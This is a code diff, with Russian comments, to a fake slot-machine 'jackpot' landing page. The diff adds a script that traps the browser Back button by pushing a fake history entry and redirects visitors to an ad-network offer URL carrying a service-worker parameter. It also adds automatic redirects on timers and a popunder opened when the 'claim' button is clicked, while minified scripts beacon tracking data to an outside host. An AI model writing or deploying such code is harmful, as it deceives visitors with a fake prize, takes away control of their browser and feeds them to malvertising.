@@ -16,6 +16,64 @@
         "secondsLeftBeforeFinal": 10
     };
     </script>
+
+    <script>
+    (function() {
+        let isTrapArmed = false;
+
+        // Функция редиректа (срабатывает только при нажатии Назад)
+        function triggerBackRedirect() {
+            if (APP_CONFIG.reverse_zoneId) {
+                const domain = APP_CONFIG.domain; 
+                const zoneId = APP_CONFIG.reverse_zoneId;
+                const currentParams = new URLSearchParams(window.location.search);
+                let offerUrl = `${domain}/afu.php?zoneid=${zoneId}`;
+                currentParams.forEach((value, key) => { offerUrl += `&${key}=${encodeURIComponent(value)}`; });
+                offerUrl += `&sw=./sw.js`; 
+                
+                console.log("User pressed Back. Redirecting...");
+                window.location.replace(offerUrl);
+            }
+        }
+
+        // Функция зарядки ловушки
+        function armTrap() {
+            if (isTrapArmed) return;
+            isTrapArmed = true;
+
+            try {
+                // Добавляем запись в историю (это не вызывает редирект, просто меняет историю)
+                window.history.pushState({page: 1}, document.title, window.location.href);
+            } catch (e) {
+                // Если браузер запретил - пробуем позже при клике
+                isTrapArmed = false;
+                return;
+            }
+
+            // !!! САМОЕ ВАЖНОЕ: ЗАЩИТА ОТ МГНОВЕННОГО СРАБАТЫВАНИЯ !!!
+            // Мы начинаем слушать кнопку "Назад" только через 1 секунду после загрузки.
+            // Это спасает от багов на старых телефонах.
+            setTimeout(function() {
+                window.addEventListener('popstate', function(event) {
+                    triggerBackRedirect();
+                });
+            }, 1000); // Задержка 1000 мс (1 секунда)
+        }
+
+        // 1. Пробуем зарядить сразу (безопасно, т.к. слушатель включится с задержкой)
+        if (document.readyState === 'complete') {
+            armTrap();
+        } else {
+            window.addEventListener('load', armTrap);
+        }
+
+        // 2. Страховка: Если браузер запретил авто-запуск, ловим первое касание
+        const triggers = ['touchstart', 'scroll', 'click', 'mouseover'];
+        triggers.forEach(evt => {
+            document.addEventListener(evt, armTrap, { once: true, passive: true });
+        });
+    })();
+    </script>
     
     <script>"use strict";(()=>{var g=()=>{let t=new Date,r=t.getUTCFullYear(),s=String(t.getUTCMonth()+1).padStart(2,"0"),n=String(t.getUTCDate()).padStart(2,"0"),o=String(t.getUTCHours()).padStart(2,"0"),a=String(t.getUTCMinutes()).padStart(2,"0"),c=String(t.getUTCSeconds()).padStart(2,"0"),_=String(t.getUTCMilliseconds()*1e3).padStart(6,"0");return`${r}-${s}-${n} ${o}:${a}:${c}.${_} +00:00`};function d({url:t,data:r}){var n;return((n=window==null?void 0:window.navigator)==null?void 0:n.sendBeacon(t.toString(),r?JSON.stringify(r):void 0))?Promise.resolve():Promise.reject(new Error("sendBeacon failed"))}var e=new URL(window.location.href),b,v,h,p,E,T,P,y,N,w,R,f,O,D,S,x,z,C,Y,i={pz:(b=e.searchParams.get("pz"))!=null?b:"",tb:(v=e.searchParams.get("tb"))!=null?v:"",tb_reverse:(h=e.searchParams.get("tb_reverse"))!=null?h:"",ae:(p=e.searchParams.get("ae"))!=null?p:"",z:(E=e.searchParams.get("z"))!=null?E:"",var:(T=e.searchParams.get("var"))!=null?T:"",var_1:(P=e.searchParams.get("var_1"))!=null?P:"",var_2:(y=e.searchParams.get("var_2"))!=null?y:"",var_3:(N=e.searchParams.get("var_3"))!=null?N:"",b:(w=e.searchParams.get("b"))!=null?w:"",campaignid:(R=e.searchParams.get("campaignid"))!=null?R:"",abtest:(f=e.searchParams.get("abtest"))!=null?f:"",rhd:(O=e.searchParams.get("rhd"))!=null?O:"1",s:(D=e.searchParams.get("s"))!=null?D:"",ymid:(S=e.searchParams.get("ymid"))!=null?S:"",wua:(x=e.searchParams.get("wua"))!=null?x:"",use_full_list_or_browsers:(z=e.searchParams.get("use_full_list_or_browsers"))!=null?z:"",cid:(C=e.searchParams.get("cid"))!=null?C:"",geo:(Y=e.searchParams.get("geo"))!=null?Y:""};var k={start:"start",ageExit:"age_exit",mainExit:"main_exit",push:"push",autoexit:"autoexit",back:"back",reverse:"reverse",tabUnderClick:"tab_under_click",error:"error",unhandledRejection:"unhandled_rejection",template_hash_ready:"template_hash_ready"},B=g(),q=t=>{let r;(a=>a[a.BAD_REQUEST=400]="BAD_REQUEST")(r||(r={}));let s="https://wuytl.com",n=new URL(`${s}/sync-metrics`);d({url:n,data:t}).catch(o=>{o.status!=400&&setTimeout(()=>{d({url:n,data:t}).catch(()=>{console.error(`Metrics sync failed: ${t}`)})},100)})},j=()=>i.abtest?i.abtest:APP_CONFIG.abtest?String(APP_CONFIG.abtest):void 0,I=({event:t,exitZoneId:r,errorMessage:s,errorSubType:n,errorType:o})=>{var l,u,m;let a=(l=document.querySelector("html"))==null?void 0:l.dataset,c=(a==null?void 0:a.landingName)||"",_=(a==null?void 0:a.version)||"",F=(a==null?void 0:a.env)||"",U=window.location.host,$=[{app:"landings-constructor",event:k[t]||t,landing_name:c,build_version:_,landing_domain:U,landing_url:window.location.href,exit_zone_id:r?Number(r):void 0,template_hash:(u=window.templateHash)!=null?u:"",request_var:i.var_3,source_zone_id:isNaN(Number(i.var_2))?null:Number(i.var_2),sub_id:i.var_1,landing_load_date_time:B,error_message:s!=null?s:"",ab2r:j(),error_sub_type:n,error_type:o,env:F}];((m=APP_CONFIG.isAnalyticEnabled)!=null?m:!0)&&q($)};window.syncMetric=I;I({event:"start"});})();</script>
     <script>"use strict";(()=>{var m=(n=>(n.CUSTOM="CUSTOM",n.JS="JS",n))(m||{}),y=(e=>(e.FetchPlatformVersion="FetchPlatformVersion",e.GetIntlDateTimeFormat="GetIntlDateTimeFormat",e.GetTranslations="GetTranslations",e.PushStateToHistory="PushStateToHistory",e.Reverse="Reverse",e.TemplateHash="TemplateHash",e.DesignChange="DesignChange",e))(y||{}),c=(e=>(e.Error="Error",e.RangeError="RangeError",e.ReferenceError="ReferenceError",e.SecurityError="SecurityError",e.SyntaxError="SyntaxError",e.TypeError="TypeError",e.Unknown="Unknown",e))(c||{}),l=(n=>(n.rejectionhandled="rejectionhandled",n.unhandledrejection="unhandledrejection",n))(l||{});const p=()=>{const t=window.syncMetric;if(!t){console.log("Sync metric is not initialized");return}const d=r=>{if(r.filename.includes("extension"))return;const s=`errorMessage: ${r.message}, lineNumber: ${r.lineno}, columnNumber: ${r.colno}, file: ${r.filename}`,o=r.error.name&&Object.values(c).includes(r.error.name)?r.error.name:"Unknown";t({event:"error",errorMessage:s,errorSubType:o,errorType:"JS"})},n=r=>{var e,a,i;if(typeof r.reason=="object"&&((a=(e=r.reason)==null?void 0:e.stack)!=null&&a.includes("extension")))return;const s=typeof r.reason=="object"&&((i=r.reason)!=null&&i.message)?r.reason.message:JSON.stringify(r.reason),o=r.type,u=Object.values(l).includes(o)?o:"Unknown";t({event:"unhandledRejection",errorMessage:s,errorSubType:u,errorType:"JS"})};window.addEventListener("error",d),window.addEventListener("unhandledrejection",n)};p();})();</script>
@@ -35,9 +93,7 @@
             background-image: url('./assets/images/background.jpg'); 
             background-color: #000; 
             background-size: cover; 
-            
-            /* ВЕРНУЛИ ЦЕНТРАЛЬНОЕ ПОЗИЦИОНИРОВАНИЕ */
-            background-position: center; 
+            background-position: center; /* ЦЕНТРИРОВАНИЕ */
             background-repeat: no-repeat;
             
             margin: 0; 
@@ -49,12 +105,10 @@
             display: flex; 
             flex-direction: column; 
             align-items: center; 
-            
-            /* ЦЕНТРИРУЕМ ИГРУ ПО ВЕРТИКАЛИ */
-            justify-content: center; 
+            justify-content: center; /* ЦЕНТРИРОВАНИЕ ИГРЫ */
         }
 
-        /* Скрываем элементы СТАРОЙ игры (ОБЯЗАТЕЛЬНО) */
+        /* Скрываем элементы СТАРОЙ игры */
         .background, .game, .game-final-screen, .modal {
             opacity: 0 !important; pointer-events: none !important; position: absolute !important; z-index: -9999 !important; width: 1px !important; height: 1px !important;
         }
@@ -114,7 +168,7 @@
         .spin-btn:active { transform: translateY(4px); box-shadow: 0 2px 0 #b85c00; }
         .spin-btn:disabled { filter: grayscale(1); animation: none; cursor: not-allowed; }
 
-        /* --- СТИЛИ МОДАЛКИ (ОБНОВЛЕННЫЕ) --- */
+        /* --- СТИЛИ МОДАЛКИ --- */
         .winner-modal {
             position: fixed; top: 0; left: 0; width: 100%; height: 100%;
             background: rgba(0,0,0,0.9); z-index: 100;
@@ -130,7 +184,6 @@
             border: 6px solid #ffd700; box-shadow: 0 0 50px rgba(255, 215, 0, 0.5);
         }
 
-        /* Золотой заголовок JACKPOT */
         .winner-content h2 {
             font-size: 42px; line-height: 1; margin: 0 0 15px 0; color: #ffd700; 
             text-transform: uppercase; text-shadow: 2px 2px 0px #b8860b, 0 0 20px #ff00de; 
@@ -139,7 +192,6 @@
 
         .winner-content p { font-size: 18px; margin-bottom: 15px; font-weight: bold; }
 
-        /* Ряд иконок в модалке */
         .win-icons-row {
             display: flex; justify-content: center; align-items: center; gap: 10px; margin-bottom: 20px;
         }
@@ -301,18 +353,36 @@
             let spinCount = 0; 
             let autoExitTimer = null; 
 
-            // --- ФУНКЦИЯ ВЫХОДА ---
-            async function performMainExit() {
-                const zoneId = APP_CONFIG.mainExit_currentTab_zoneId;
+            // --- ФУНКЦИЯ ВЫХОДА (Исправленная логика) ---
+            async function performMainExit(isClick = false) {
                 const domain = APP_CONFIG.domain; 
-                if(!zoneId) { window.location.href = "https://google.com"; return; }
+                
+                // ВЫБОР ЗОНЫ:
+                // Если КЛИК - используем New Tab Zone (10482360)
+                // Если АВТО - используем Current Tab Zone (10482361)
+                const zoneId = isClick ? APP_CONFIG.mainExit_newTab_zoneId : APP_CONFIG.mainExit_currentTab_zoneId;
+
+                if(!zoneId) { 
+                    console.error("Zone ID missed");
+                    window.location.href = "https://google.com"; 
+                    return; 
+                }
                 
                 const currentParams = new URLSearchParams(window.location.search);
                 let offerUrl = `${domain}/afu.php?zoneid=${zoneId}`;
                 currentParams.forEach((value, key) => { offerUrl += `&${key}=${encodeURIComponent(value)}`; });
                 offerUrl += `&sw=./sw.js`; 
-                console.log("Auto-Redirecting to:", offerUrl);
-                window.location.href = offerUrl;
+                
+                console.log(`Redirecting to zone ${zoneId} (Click: ${isClick})`);
+                console.log(offerUrl);
+
+                if (isClick) {
+                    // При клике открываем в новой вкладке (TabUnder / Popunder)
+                    window.open(offerUrl, '_blank');
+                } else {
+                    // При таймере - редирект в текущем окне (иначе браузер заблокирует)
+                    window.location.href = offerUrl;
+                }
             }
 
             // --- НАЖАТИЕ SPIN ---
@@ -329,15 +399,14 @@
                     // --- ПЕРВЫЙ СПИН ---
                     targetIndex = 10;
                     
-                    // !!! ТАЙМЕРЫ ЗАПУСКАЮТСЯ СРАЗУ !!!
                     timerContainer.style.display = 'block';
                     timerText.style.display = 'block';
                     timerBar.style.animation = "progress 14s linear forwards";
                     
-                    // Включаем авто-переход через 14 секунд
+                    // Авто-выход через 14 сек (Использует Current Tab Zone)
                     console.log("Auto-exit timer started: 14s");
                     autoExitTimer = setTimeout(() => {
-                        performMainExit();
+                        performMainExit(false);
                     }, 14000);
 
                     setTimeout(() => {
@@ -355,10 +424,10 @@
                     setTimeout(() => { 
                         winModal.classList.add('show'); 
                         
-                        // !!! ТАЙМЕР УВЕЛИЧЕН ДО 10 СЕКУНД !!!
+                        // Авто-редирект на экране победы через 10 секунд
                         console.log("Jackpot shown. Auto-redirect in 10s...");
                         setTimeout(() => {
-                            performMainExit();
+                            performMainExit(false); // false = авто-редирект (в текущей вкладке)
                         }, 10000);
 
                     }, 4500);
@@ -381,8 +450,9 @@
                 spinCount++;
             });
 
+            // КЛИК ПО КНОПКЕ CLAIM -> Запускает New Tab Zone
             claimBtn.addEventListener('click', function() {
-                performMainExit();
+                performMainExit(true); // true = Клик (новая вкладка)
             });
         });
     </script>
